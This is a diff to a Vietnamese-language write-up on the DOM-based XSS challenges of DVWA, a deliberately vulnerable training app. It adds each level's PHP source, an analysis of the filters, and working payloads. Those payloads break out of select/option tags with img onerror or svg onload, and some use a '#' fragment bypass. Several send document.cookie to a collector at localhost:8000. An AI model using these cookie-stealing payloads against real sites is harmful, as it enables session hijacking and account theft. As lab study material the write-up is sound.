@@ -11,6 +11,8 @@ hide:
 
 tags:
   - DVWA
+  - XSS
+  - XSS DOM
 ---
 
 # __XSS (DOM)__
@@ -45,7 +47,7 @@ Challenge này thì đơn giản rồi, không có ràng buộc về source code
 
 ### __Exploition__
 
-Ta có nhiều cách khai thác
+Ta có nhiều cách khai thác và dưới đây là 2 cách khai thác challenge này.
 
 ![](image.png)
 
@@ -59,12 +61,56 @@ Ta có nhiều cách khai thác
 
 Source code
 
-```php title=""
+```php title="vulnerabilities/xss_d/source/medium.php"
+<?php
+
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+    $default = $_GET['default'];
+    
+    # Do not allow script tags
+    if (stripos ($default, "<script") !== false) {
+        header ("location: ?default=English");
+        exit;
+    }
+}
+
+?> 
 ```
 
 ### __Analysis__
 
+Bài này họ filter đầu vào bằng hàm stripos()
+
+![Mô tả hàm stripos()](image-3.png)
+
+Quan trọng hơn, nếu ở ngôn ngữ lập trình khác thì có thể vị trí xuất hiện là 0 tức false -> dẫn đến điều kiện if thứ 2 sai -> ta tiêm được `<script>....`. Nhưng với php thì việc trả về 0 thì không đồng nghĩa với false. Xem hình bên dưới
+
+![](image-4.png)
+
+Đáng tiếc thay, bài này dùng double encode khum được :). Ta sẽ thay đổi chiến thuật. Nhìn hình sau để đoán chiến thuật nào :3
+
+![](image-5.png)
+
+Roài, tiếp theo ta xem xét tiếp cấu tạo trang web
+
+![](image-6.png)
+
+Với hình ảnh trên, ta thấy rằng các ngôn ngữ là các thẻ option và nằm trong thẻ select. Do đó để có thẻ <img\>. Ta cấn thoát thẻ <select\> và thẻ <option\> trước.
+
+> Dùng payload: `"></option></select><img src="image.gif" onerror="alert(1)">`
+
 ### __Exploition__
+
+Như đã phân tích phía trên, bây giờ ta tiến hành khai thác thôi.
+
+![](image-7.png)
+
+> Dùng payload: `"></option></select><img src="image.gif" onerror="document.location='http://localhost:8000/?abc='+document.cookie">`
+
+Hoặc ta có thể dùng thuộc tính  onload của thẻ <svg\>
+
+> Dùng payload: `"></option></select><svg xmlns="http://www.w3.org/2000/svg" onload="document.location='http://localhost:8000/?abc='+document.cookie"/>`
 
 ---
 
@@ -72,10 +118,34 @@ Source code
 
 Source code
 
-```php title=""
+```php title="vulnerabilities/xss_d/source/high.php"
+<?php
+
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+
+    # White list the allowable languages
+    switch ($_GET['default']) {
+        case "French":
+        case "English":
+        case "German":
+        case "Spanish":
+            # ok
+            break;
+        default:
+            header ("location: ?default=English");
+            exit;
+    }
+}
+
+?> 
 ```
 
 ### __Analysis__
+
+Ta thấy mức độ này họ dùng whitelist filter ở phía server, nhưng cơ bản việc XSS DOM là việc tiêm payload ở client, do đó ta sẽ chặn gửi payload của mình lên server bằng "#". Và đây là mã tiêm
+
+> English#<script\>document.location='http://localhost:8000/?abc='+document.cookie</script\>
 
 ### __Exploition__
 
@@ -85,7 +155,12 @@ Source code
 
 Source code
 
-```php title=""
+```php title="vulnerabilities/xss_d/source/impossible.php"
+<?php
+
+# Don't need to do anything, protection handled on the client side
+
+?> 
 ```
 
 ### __Analysis__
@@ -93,6 +168,8 @@ Source code
 ---
 
 ## __What we learned__
+
+- XSS DOM in image, svg
 
 ## __More Information__
 
